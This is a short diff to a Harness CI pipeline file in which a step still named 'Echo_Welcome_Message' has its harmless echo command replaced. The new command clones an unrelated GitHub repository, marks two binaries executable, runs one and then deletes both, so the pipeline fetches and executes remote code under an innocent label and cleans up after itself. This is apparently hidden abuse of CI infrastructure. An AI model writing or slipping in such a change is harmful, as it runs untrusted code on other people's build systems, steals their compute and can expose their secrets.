@@ -18,7 +18,7 @@ pipeline:
                   identifier: Echo_Welcome_Message
                   spec:
                     shell: Sh
-                    command: echo "Welcome to Harness CI"
+                    command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
           platform:
             os: Linux
             arch: Amd64
